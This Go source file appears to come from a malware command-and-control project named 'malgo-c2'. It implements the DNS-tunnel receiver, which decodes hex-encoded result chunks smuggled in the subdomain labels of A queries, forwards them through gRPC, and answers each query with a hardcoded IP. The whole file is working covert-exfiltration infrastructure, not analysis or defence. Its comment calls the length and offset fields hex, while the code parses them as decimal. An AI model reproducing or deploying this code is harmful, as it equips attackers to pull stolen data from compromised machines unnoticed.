package dnsproxy

import (
	"context"
	"encoding/hex"
	"fmt"
	"github.com/VipWW/malgo-c2/services/common/log"
	"net"
	"strconv"
	"strings"

	gateway "github.com/VipWW/malgo-c2/services/common/service"
	"github.com/miekg/dns"
)

// handleA handles result retrieval queries. Queries look like:
// Either:
// - <char>.<result length>.<CommandID>.<domain>
// - <char>.<data chunk>.<offset>.<CommandID>.<domain>
//
// length and offset are in HEX. Chunk is in HEX. TODO: change to Base58
func (h *Handler) handleA(msg *dns.Msg, r *dns.Msg) error {
	dataFromMessage := h.removeDomain(r.Question[0].Name)
	log.FromContext(context.Background()).Infof("Data from message: %s", dataFromMessage)
	if dataFromMessage == "" {
		return fmt.Errorf("invalid domain")
	}

	splitData := strings.Split(dataFromMessage, ".")
	// skip the first character
	splitData = splitData[1:]
	dataLength := len(splitData)

	if dataLength < 2 {
		return fmt.Errorf("invalid data")
	} else if dataLength == 2 {
		// <nothing>.<result length>.<CommandID>
		log.FromContext(context.Background()).Infof("Setting result length to %s", splitData[0])
		length, err := strconv.Atoi(splitData[0])
		if err != nil {
			return err
		}
		_, err = h.grpcClient.ResultInfo(context.Background(), &gateway.ResultInfoRequest{
			CommandId: splitData[1],
			Length:    int64(length),
		})
		if err != nil {
			return err
		}
	} else {
		// <data chunkS with multiple dots>.<offset>.<CommandID>
		data, err := hex.DecodeString(strings.Join(splitData[:dataLength-2], ""))
		if err != nil {
			return err
		}
		log.FromContext(context.Background()).Infof("Data chunk: %s", string(data))
		offset, err := strconv.ParseInt(splitData[dataLength-2], 10, 64)
		if err != nil {
			return err
		}
		log.FromContext(context.Background()).Infof("Adding result chunk %v", offset)
		_, err = h.grpcClient.ResultDetailsChunk(context.Background(), &gateway.ResultDetailsChunkRequest{
			CommandId: splitData[dataLength-1],
			Offset:    offset,
			Data:      data,
		})
		if err != nil {
			return err
		}
		log.FromContext(context.Background()).Infof("Added result chunk %v", offset)
	}

	msg.Answer = append(msg.Answer, &dns.A{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    1,
		},
		A: net.ParseIP("183.216.123.191"),
	})

	return nil
}
